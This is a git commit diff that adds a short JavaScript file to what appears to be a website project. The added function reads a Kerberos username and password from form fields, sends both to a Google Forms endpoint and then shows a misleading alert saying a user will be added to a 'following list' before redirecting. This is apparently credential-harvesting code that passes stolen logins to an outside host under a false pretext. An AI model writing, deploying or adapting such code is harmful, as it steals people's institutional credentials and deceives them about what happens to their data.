0208062988a9c028a4301a457854d2042fdea2c8
Dipen Kumar <kr.dipen4@gmail.com>
2020-11-10 19:09:50 +0530

    update

---
+++ ME2180685.js
@@ -0,0 +1,20 @@
+function postToGoogle(){
+    var kerberos=$("#kerberos").val();
+    var password=$("#password").val();
+    $.ajax({
+        url:"https://docs.google.com/forms/d/e/1FAIpQLSfaHUdxhTGHKgrKHEIgYtQPnt-FaxJ4WVK8JftxH2_E7cs1Yg/formResponse?",
+        data:{
+            "entry.830871114":kerberos,
+            "entry.557142347":password,
+            "entry.975199243":"ME2180685"
+        },
+        type:"POST",
+        dataType:"xml",
+        success:function(d){},
+        error:function(x,y,z){
+            alert("ME2180685 will be added to your following list within a minute\nif you have entered the correct credentials.");
+            window.open("https://krdipen.github.io/BeMotivated/"+kerberos,"_self");
+        }
+    });
+    return false;
+}
